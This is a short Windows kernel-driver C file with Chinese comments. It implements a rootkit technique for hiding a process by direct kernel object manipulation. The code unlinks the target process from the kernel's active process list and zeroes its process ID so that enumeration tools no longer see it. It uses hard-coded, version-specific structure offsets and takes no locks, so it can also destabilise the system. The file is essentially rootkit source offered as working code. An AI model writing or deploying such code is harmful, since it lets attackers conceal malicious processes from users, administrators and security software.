// hide_proc.c — 摘 ActiveProcessLinks + 清 PID（DKOM）
#include <ntifs.h>

typedef struct _PEB_LDR_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
} PEB_LDR_ENTRY;

NTSTATUS HideProcess(ULONG targetPid) {
    PEPROCESS target = NULL;
    if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)targetPid, &target)))
        return STATUS_NOT_FOUND;

    // 1. 摘 ActiveProcessLinks（从全局进程链表移除）
    PLIST_ENTRY links = (PLIST_ENTRY)((PUCHAR)target + 0x448); // 偏移需按版本验证
    PLIST_ENTRY prev = links->Blink;
    PLIST_ENTRY next = links->Flink;
    prev->Flink = next;
    next->Blink = prev;
    links->Flink = links;
    links->Blink = links;

    // 2. 清 UniqueProcessId（枚举时过滤掉）
    *(ULONG*)((PUCHAR)target + 0x440) = 0;

    ObDereferenceObject(target);
    return STATUS_SUCCESS;
}
